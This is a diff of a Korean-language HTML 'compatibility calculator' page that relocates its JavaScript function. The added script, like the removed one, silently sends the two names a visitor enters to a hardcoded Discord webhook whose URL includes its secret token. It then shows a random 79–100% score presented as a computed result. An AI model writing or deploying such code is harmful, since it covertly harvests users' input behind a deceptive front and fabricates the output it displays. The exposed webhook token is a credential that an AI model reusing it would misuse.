@@ -74,36 +74,6 @@
             background-color: #f9f9f9;
         }
     </style>
-    <script>
-        function sendMessage() {
-            var name1 = document.getElementById("name1").value;
-            var name2 = document.getElementById("name2").value;
-            var inputText = name1 + ", " + name2;
-            // 여기서 디스코드 웹훅 URL을 수정하세요.
-            var discordWebhookURL = "https://discord.com/api/webhooks/1221117676206952449/SYa8cjd6H0T9s5m9yU-hDczHc5g5MQITv29m3w2vwhDNZhPEFMvpCZTHtGhFCYG-9uyF";
-
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", discordWebhookURL);
-            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-            var payload = {
-                content: inputText
-            };
-
-            xhr.send(JSON.stringify(payload));
-
-            // 결과를 표시할 div에 결과를 추가합니다.
-            var resultDiv = document.getElementById("result");
-            resultDiv.style.display = "block"; // 결과를 표시합니다.
-            resultDiv.innerHTML = "궁합 확인중...";
-            
-            // 결과를 무작위로 생성하여 표시합니다.
-            var randomNumber = Math.floor(Math.random() * (100 - 79 + 1)) + 79;
-            setTimeout(function() {
-                resultDiv.innerHTML = "궁합 결과: " + randomNumber + "%";
-            }, 2000);
-        }
-    </script>
 </head>
 <body>
     <div class="container">
@@ -120,5 +90,38 @@
         <!-- 결과를 표시할 div -->
         <div id="result"></div>
     </div>
+
+    <script>
+        function sendMessage() {
+            var name1 = document.getElementById("name1").value;
+            var name2 = document.getElementById("name2").value;
+            var inputText = name1 + ", " + name2;
+            // 여기서 디스코드 웹훅 URL을 수정하세요.
+            var discordWebhookURL = "https://discord.com/api/webhooks/1221117676206952449/SYa8cjd6H0T9s5m9yU-hDczHc5g5MQITv29m3w2vwhDNZhPEFMvpCZTHtGhFCYG-9uyF";
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", discordWebhookURL);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+            // 결과 값을 생성합니다.
+            var result = Math.floor(Math.random() * (100 - 79 + 1)) + 79;
+
+            var payload = {
+                content: inputText + "의 궁합 결과: 계산중..." // 결과 값을 메시지에 포함시킵니다.
+            };
+
+            xhr.send(JSON.stringify(payload));
+
+            // 결과를 표시할 div에 결과를 추가합니다.
+            var resultDiv = document.getElementById("result");
+            resultDiv.style.display = "block"; // 결과를 표시합니다.
+            resultDiv.innerHTML = "궁합 결과: 계산중..."; // "계산중..."으로 설정합니다.
+
+            // 1초 후에 결과를 설정합니다.
+            setTimeout(function() {
+                resultDiv.innerHTML = "궁합 결과: " + result + "%";
+            }, 1000);
+        }
+    </script>
 </body>
 </html>
